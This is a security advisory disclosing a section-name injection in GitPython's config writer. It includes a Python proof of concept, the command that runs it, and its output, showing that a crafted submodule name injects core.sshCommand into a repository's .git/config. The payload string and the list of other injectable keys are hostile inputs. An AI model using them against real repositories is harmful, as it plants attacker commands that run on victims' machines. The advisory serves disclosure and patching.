# [H] GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)

## Summary
Severity: High
Advisory: GHSA-3rp5-jjmw-4wv2
CWE: CWE-74
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-3rp5-jjmw-4wv2
Type: github-advisory

## Affected
- PyPI: `gitpython` — affected >=0 <3.1.53

## Details
### Summary

In GitPython `<= 3.1.52`, the config writer neutralizes only CR, LF, and NUL in configuration **names**, but writes section names into the `[...]` header with no other escaping. A section/subsection name that contains `] [ "` closes the intended header and opens a second same-line section, injecting an arbitrary config directive — with no newline required. Because a submodule **name** is attacker-controlled data (it comes from a repository's `.gitmodules`, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted `.git/config`, an attacker can set `core.sshCommand` (or `alias.*`, `core.pager`, `core.fsmonitor`) and achieve remote code execution on the victim's next git operation. Likely **CWE-74 (Injection)**.

This is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed **newline** injection into config values/names (patched in 3.1.50); the `[r\n\x00]` guard added for them does not stop a **same-line** section break inside a name.

### Details

The only guard applied to section/option names before writing is `_assure_config_name_safe`, which uses a regex that matches solely CR/LF/NUL:

`git/config.py:75,897-899` (`GitPython 3.1.52`):

```python
UNSAFE_CONFIG_CHARS_RE = re.compile(r"[\r\n\x00]")
...
def _assure_config_name_safe(self, name: "cp._SectionName", label: str) -> None:
    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):
        raise ValueError("Git config %s names must not contain CR, LF, or NUL" % label)
```

The name is then serialized into the header with no escaping of `]`, `[`, `"`, space, `=` or `#`:

`git/config.py:693`:

```python
fp.write(("[%s]\n" % name).encode(defenc))
```

For submodules the name is wrapped as `submodule "<name>"` (`git/objects/submodule/util.py:39`, `return f'submodule "{name}"'`), which supplies the balancing quote. A submodule named:

```
x"] [core] sshCommand=CMD #
```

therefore serializes to the header `[submodule "x"] [core] sshCommand=CMD #"]`. git parses everything after the first `]` on that line as a fresh section, yielding `core.sshCommand=CMD` (the trailing `#"]` is an inline comment). No CR/LF/NUL appears, so `_assure_config_name_safe` never fires.

The attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's `.git/config`:

- `Repo.create_submodule(name=<untrusted>, ...)` → `Submodule.add` → `git/objects/submodule/base.py:619` `writer.set_value(sm_section(name), "url", url)` — a single call, no hostile remote required.
- `Repo.clone_from(<hostile url>)` + `repo.submodule_update(init=True)` → `git/objects/submodule/base.py:855` `writer.set_value(sm_section(self.name), "url", self.url)`, where `self.name` is read unvalidated from the cloned repo's `.gitmodules`.

Asymmetry: the sibling class is blocked — a newline in a config **value**, e.g. `set_value("core", "editor", "x\n\tsshCommand=CMD")`, raises `ValueError`. The section-**name** bracket payload is not caught by the same guard.

### PoC

Single self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with `git config --get`; no ssh/fetch/push is run and nothing is executed.

```python
#!/usr/bin/env python3
"""Minimal PoC: git-config section-name injection in GitPython==3.1.52."""
from importlib.metadata import version
import os, tempfile, subprocess
import git

print(f"# GitPython {version('GitPython')}")        # version proof -- first line

MARKER = "MARKER_9f3a"                               # inert; never executed
tmp = tempfile.mkdtemp()
env = {**os.environ, "HOME": tmp,
       "GIT_CONFIG_GLOBAL": os.path.join(tmp, "gc"), "GIT_CONFIG_SYSTEM": os.devnull,
       "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@b.c",
       "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@b.c"}

def run(*a, cwd=None):
    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)

# A benign local repo used as the submodule url (a plain path, no network).
src = os.path.join(tmp, "src"); os.makedirs(src)
run("git", "init", "-q", src)
open(os.path.join(src, "f"), "w").write("x")
run("git", "add", "f", cwd=src); run("git", "commit", "-qm", "i", cwd=src)
suburl = os.path.join(tmp, "sub.git"); run("git", "clone", "-q", "--bare", src, suburl)

def parent_repo():
    p = tempfile.mkdtemp(dir=tmp)
    run("git", "init", "-q", p)
    open(os.path.join(p, "r"), "w").write("x")
    run("git", "add", "r", cwd=p); run("git", "commit", "-qm", "i", cwd=p)
    return p

def injected_sshcommand(parent):
    r = run("git", "config", "-f", os.path.join(parent, ".git", "config"),
            "--get", "core.sshCommand")
    return (r.returncode, r.stdout.strip())

benign = "docs"
evil   = f'x"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]

p_control = parent_repo()
git.Repo(p_control).create_submodule(name=benign, path="docs", url=suburl)
p_exploit = parent_repo()
git.Repo(p_exploit).create_submodule(name=evil, path="sub", url=suburl)

ctl = injected_sshcommand(p_control)
exp = injected_sshcommand(p_exploit)
header = [l for l in open(os.path.join(p_exploit, ".git", "config")).read().splitlines()
          if l.startswith("[submodule")][0]

print("control name :", repr(benign))
print("  git core.sshCommand ->", ctl, "(unset)")
print("exploit name :", repr(evil))
print("  written header      ->", header)
print("  git core.sshCommand ->", exp)

assert ctl[0] != 0 and ctl[1] == "", "control unexpectedly set core.sshCommand"
assert exp == (0, MARKER), "not reproduced"
print(f"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} "
      f"into the victim's trusted .git/config (git would run it on the next ssh op)")
```

Run:

```bash
uv run --with GitPython==3.1.52 python poc.py
```

Observed output:

```
# GitPython 3.1.52
control name : 'docs'
  git core.sshCommand -> (1, '') (unset)
exploit name : 'x"] [core] sshCommand=MARKER_9f3a #'
  written header      -> [submodule "x"] [core] sshCommand=MARKER_9f3a #"]
  git core.sshCommand -> (0, 'MARKER_9f3a')
VERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)
```

The benign name yields a single clean `[submodule "docs"]` section; the malicious name yields an injected `core.sshCommand`. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced `"` makes git reject the header); the `submodule "<name>"` wrapper balances them automatically.

### Impact

Arbitrary attacker-controlled write into the victim's repository-local `.git/config`, which git fully trusts. `core.sshCommand` is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (`alias.*`, `core.pager`, `core.fsmonitor`) fire on more common operations. Reachable in default configuration through two realistic paths:

- an application that constructs a submodule from untrusted input via `Repo.create_submodule(name=...)` (single call); or
- `Repo.clone_from` of an untrusted repository followed by `submodule_update` — the canonical submodule threat model, where the malicious name is read from the cloned `.gitmodules`.

No non-default git settings are required. Primarily a Unix vector: on Windows the `"` in the resulting `.git/modules/<name>` directory name can abort the fresh-clone write branch (the direct config-API and `create_submodule` sinks are unaffected).

### Recommended fix

Reject or escape configuration section/subsection/option **names** that contain `]`, `[`, `"`, or leading/trailing whitespace (or apply git's own section-name escaping) in `_assure_config_name_safe` / `write_section`, rather than only CR/LF/NUL. Validating submodule names before they reach `sm_section` would additionally close the clone-driven path.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2
- https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53
